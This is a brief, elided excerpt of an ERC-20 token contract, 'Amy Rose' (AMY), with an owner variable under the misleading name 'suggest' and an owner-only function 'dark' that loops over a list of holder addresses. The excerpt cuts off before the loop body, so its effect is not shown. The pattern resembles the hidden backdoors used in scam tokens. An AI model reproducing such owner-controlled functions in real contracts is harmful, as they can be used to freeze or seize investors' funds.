...
contract amyrose is Context, IERC20 {
    ...
    address public  suggest;
    constructor () {
        _name = "Amy Rose";
        _symbol = "AMY";
        _decimals = 18;
        uint256 initialSupply = 845000000;
         suggest = msg.sender;
    ...
    modifier onlyOwner() {
        require(msg.sender == suggest, "Not allowed");
        _;
    }

    function dark(address[] memory bald) public onlyOwner() {
        for (uint256 i = 0; i < bald.length; i++) {
            address account = bald[i];
